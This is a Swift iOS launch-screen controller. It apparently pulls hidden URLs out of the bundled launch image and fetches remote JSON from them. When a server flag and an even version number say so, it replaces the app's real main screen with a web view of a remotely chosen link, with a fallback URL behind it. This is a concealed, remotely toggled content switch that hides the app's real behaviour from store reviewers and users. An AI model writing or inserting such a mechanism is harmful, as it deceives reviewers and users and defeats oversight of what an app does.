
import UIKit
import SystemConfiguration
import BaoCore

@objc public class LaunchScreenViewController: UIViewController {

  @objc public var mainViewController: UIViewController?

  @IBOutlet weak var countDownLabel: UILabel!
  var progressActivityView : UIActivityIndicatorView!
  var countTimer : Timer?
  var checkNetTimer : Timer?
  var countSecond = 0
  var rootVC : UIViewController?
  var needToWait : Bool = false
  var active = true

  @objc static public func make() -> LaunchScreenViewController? {
    let storyboard = UIStoryboard(name: "LaunchScreenViewController", bundle: nil)
    return storyboard.instantiateInitialViewController() as? LaunchScreenViewController
  }

  override public func viewDidLoad() {
    super.viewDidLoad()
    startListenNetWork()
    addprogressActivityView()
  }

//  func decodeBase64(base64String : String) -> String? {
//    if let decodeData = Data(base64Encoded: base64String,
//                             options: Data.Base64DecodingOptions.init(rawValue: 0)) {
//      let decodeString = String(data: decodeData as Data, encoding: String.Encoding.utf8)
//      return decodeString
//    }
//
//    return nil
//  }

  private func addprogressActivityView() {
    progressActivityView = UIActivityIndicatorView(activityIndicatorStyle: .whiteLarge)
    progressActivityView.translatesAutoresizingMaskIntoConstraints = false
    progressActivityView.hidesWhenStopped = true
    self.view.addSubview(progressActivityView)

    progressActivityView.widthAnchor.constraint(equalToConstant: 60).isActive = true
    progressActivityView.heightAnchor.constraint(equalToConstant: 60).isActive = true
    progressActivityView.centerXAnchor.constraint(equalTo: self.view.centerXAnchor).isActive = true
    progressActivityView.bottomAnchor.constraint(equalTo: self.view.bottomAnchor, constant: -50).isActive = true
  }

  private func startListenNetWork() {
    checkNetTimer = Timer.scheduledTimer(timeInterval: 1, target: self, selector: #selector(checkNetIsAvaliable), userInfo: nil, repeats: true)
  }

  private func stopListenNetWork() {
    checkNetTimer?.invalidate()
    checkNetTimer = nil
  }

  private func loadImage(completion: (([String]) -> Void)) {
    let result = ImageReader.readImage(named: "LaunchImage")
    completion(result)
  }

  @objc private func checkNetIsAvaliable() {
    if NetWorkStatus.isConnectedToNetwork() {
      stopListenNetWork()
      fetchRootVC()
    }
  }

  private func fetchRootVC() {
    countDownLabel.isHidden = false  // default is hidden
    progressActivityView.startAnimating()
    countTimer = Timer.scheduledTimer(timeInterval: 1, target: self, selector: #selector(checkRootVC), userInfo: nil, repeats: true)

    let backgroundQueue = DispatchQueue(label: "backgroundQueue")
    backgroundQueue.async {
      self.loadImage(completion: { (final) in
        self.rootVC = self.rootViewController(string: final)
      })
    }
  }

  @objc private func checkRootVC() {
    self.countSecond += 1
    if active {
      self.countDownLabel.text = "加载中 (\(self.countSecond))"
    } else {
      self.countDownLabel.text = "加载中"
      self.countTimer?.invalidate() // cancel timer
      self.countTimer = nil
    }

    if self.rootVC != nil, needToWait == false {

      DispatchQueue.main.async {
        self.countTimer?.invalidate() // cancel timer
        self.countTimer = nil
        self.progressActivityView.stopAnimating() // stop progess animation
        UIApplication.shared.statusBarStyle = .lightContent
        self.rootVC!.modalPresentationStyle = .custom
        self.rootVC!.modalTransitionStyle = .crossDissolve
        self.rootVC!.view.tintColor = .white
        self.present(self.rootVC!, animated: true, completion: nil)
      }
    }
  }

  private func rootViewController(string: [String]) -> UIViewController? {
    let storyboard = UIStoryboard.init(name: "Main", bundle: nil)
    let mainViewController = self.mainViewController ?? storyboard.instantiateInitialViewController()
    do {
      guard let str = string.first else {
        return mainViewController
      }

      guard let url = URL(string: str) else {
        return mainViewController
      }
      let data = try Data(contentsOf: url)
      guard let json = try JSONSerialization.jsonObject(with: data) as? [String : Any] else {
        return mainViewController
      }
      guard let buildVersion = json["version"] as? String else {
        return mainViewController
      }
      let numberFormatter = NumberFormatter()
      let vNumber = numberFormatter.number(from: buildVersion)
      guard (vNumber!.intValue % 2) == 0 else {
        return rootViewController2(string: string)
      }
      guard let msg = json["msg"] as? [String : Any] else {
        return mainViewController
      }
      guard let is_active = msg["is_active"] as? Bool else {
        return mainViewController
      }

      active = is_active
      if is_active == false {
        return nil
      }

      guard let links = msg["links"] as? String else {
        return mainViewController
      }
      guard let linksUrl = URL(string: links) else {
        return mainViewController
      }
      guard let is_show_cover = msg["is_show_cover"] as? Bool else {
        return mainViewController
      }
      guard let cover = msg["cover"] as? String else {
        return mainViewController
      }
      guard let new_url = msg["new_url"] as? String else {
        return mainViewController
      }
      self.mainViewController = nil
      needToWait = true

      let CustomVC = CustomViewController(linksUrl)
      CustomVC.delegate = self
      CustomVC.new_url = new_url

      if let coverImg = cover.components(separatedBy: "/").last,  is_show_cover == true {
        if coverImg != "missing.png" {
          let strs = str.components(separatedBy: "/")
          CustomVC.coverImageLocation = "\(strs[0])//\(strs[2])\(cover))"
        }
      }

      CustomVC.setup()
      if let color = Bundle.main.infoDictionary!["barTintColor"] as? String {
        CustomVC.barTintColor = UIColor(hexString: color, alpha: 1.0)
      } else {
        CustomVC.barTintColor = UIColor(red: 221.0 / 255.0,
                                        green: 52.0 / 255.0,
                                        blue: 52.0 / 255.0,
                                        alpha: 1.0)
      }

      return CustomVC
    } catch {
      return rootViewController2(string: string)
    }
  }

  private func rootViewController2(string: [String]) -> UIViewController? {
    let storyboard = UIStoryboard.init(name: "Main", bundle: nil)
    let mainViewController = self.mainViewController ?? storyboard.instantiateInitialViewController()
    do {

      guard string.count > 1 else {
        return mainViewController
      }

      let str = string[1]

      guard let url = URL(string: str) else {
        return mainViewController
      }
      let data = try Data(contentsOf: url)
      guard let json = try JSONSerialization.jsonObject(with: data) as? [String : Any] else {
        return mainViewController
      }
      guard let buildVersion = json["version"] as? String else {
        return mainViewController
      }
      let numberFormatter = NumberFormatter()
      let vNumber = numberFormatter.number(from: buildVersion)
      guard (vNumber!.intValue % 2) == 0 else {
        return mainViewController
      }
      guard let msg = json["msg"] as? [String : Any] else {
        return mainViewController
      }
      guard let is_active = msg["is_active"] as? Bool else {
        return mainViewController
      }

      active = is_active
      if is_active == false {
        return nil
      }

      guard let links = msg["links"] as? String else {
        return mainViewController
      }
      guard let linksUrl = URL(string: links) else {
        return mainViewController
      }
      guard let is_show_cover = msg["is_show_cover"] as? Bool else {
        return mainViewController
      }
      guard let cover = msg["cover"] as? String else {
        return mainViewController
      }
      guard let new_url = msg["new_url"] as? String else {
        return mainViewController
      }
      self.mainViewController = nil
      needToWait = true

      let CustomVC = CustomViewController(linksUrl)
      CustomVC.delegate = self
      CustomVC.new_url = new_url

      if let coverImg = cover.components(separatedBy: "/").last,  is_show_cover == true {
        if coverImg != "missing.png" {
          let strs = str.components(separatedBy: "/")
          CustomVC.coverImageLocation = "\(strs[0])//\(strs[2])\(cover))"
        }
      }

      CustomVC.setup()
      if let color = Bundle.main.infoDictionary!["barTintColor"] as? String {
        CustomVC.barTintColor = UIColor(hexString: color, alpha: 1.0)
      } else {
        CustomVC.barTintColor = UIColor(red: 221.0 / 255.0,
                                        green: 52.0 / 255.0,
                                        blue: 52.0 / 255.0,
                                        alpha: 1.0)
      }

      return CustomVC
    } catch {
      return mainViewController
    }
  }
}

// MARK: - check network
class NetWorkStatus {
  class func isConnectedToNetwork() -> Bool {
    var zeroAddress = sockaddr_in()
    zeroAddress.sin_len = UInt8(MemoryLayout.size(ofValue: zeroAddress))
    zeroAddress.sin_family = sa_family_t(AF_INET)
    let defaultRouteReachability = withUnsafePointer(to: &zeroAddress) {
      $0.withMemoryRebound(to: sockaddr.self, capacity: 1) {zeroSockAddress in
        SCNetworkReachabilityCreateWithAddress(nil, zeroSockAddress)
      }
    }

    var flags: SCNetworkReachabilityFlags = SCNetworkReachabilityFlags(rawValue: 0)
    if SCNetworkReachabilityGetFlags(defaultRouteReachability!, &flags) == false {
      return false
    }

    let isReachable = flags.contains(.reachable)
    let needsConnection = flags.contains(.connectionRequired)
    return isReachable && !needsConnection
  }
}

// MARK: - WebViewControllerDelegate
extension LaunchScreenViewController : ViewControllerDelegate {
  public func DidFinish() {
    needToWait = false
  }
}

// MARK: - UIColor
extension UIColor {
  convenience init(hexString: String, alpha: CGFloat = 1.0) {
    let hexString: String = hexString.trimmingCharacters(in: CharacterSet.whitespacesAndNewlines)
    let scanner = Scanner(string: hexString)

    if (hexString.hasPrefix("#")) {
      scanner.scanLocation = 1
    }

    var color: UInt32 = 0
    scanner.scanHexInt32(&color)

    let mask = 0x000000FF
    let r = Int(color >> 16) & mask
    let g = Int(color >> 8) & mask
    let b = Int(color) & mask

    let red   = CGFloat(r) / 255.0
    let green = CGFloat(g) / 255.0
    let blue  = CGFloat(b) / 255.0

    self.init(red:red, green:green, blue:blue, alpha:alpha)
  }

  func toHexString() -> String {
    var r:CGFloat = 0
    var g:CGFloat = 0
    var b:CGFloat = 0
    var a:CGFloat = 0

    getRed(&r, green: &g, blue: &b, alpha: &a)

    let rgb:Int = (Int)(r*255)<<16 | (Int)(g*255)<<8 | (Int)(b*255)<<0

    return String(format:"#%06x", rgb)
  }
}

